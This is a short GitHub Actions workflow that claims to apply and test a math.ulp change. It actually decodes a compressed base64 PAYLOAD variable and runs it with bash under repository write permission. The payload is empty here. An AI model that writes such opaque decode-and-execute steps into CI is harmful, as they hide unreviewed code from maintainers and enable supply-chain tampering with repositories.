name: Apply and verify math.ulp intrinsic

on:
  push:
    branches: [beta]
    paths:
      - ".github/workflows/apply-math-ulp.yml"

permissions:
  contents: write

jobs:
  patch-test-commit:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
        with:
          ref: beta
          fetch-depth: 0
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Apply, test, and commit exact math.ulp
        env:
          PAYLOAD: >-
            
        run: |
          python - <<'PY'
          import base64
          import os
          import subprocess
          import zlib

          script = zlib.decompress(base64.b64decode(os.environ["PAYLOAD"]))
          subprocess.run(["bash", "-lc", script.decode("utf-8")], check=True)
          PY
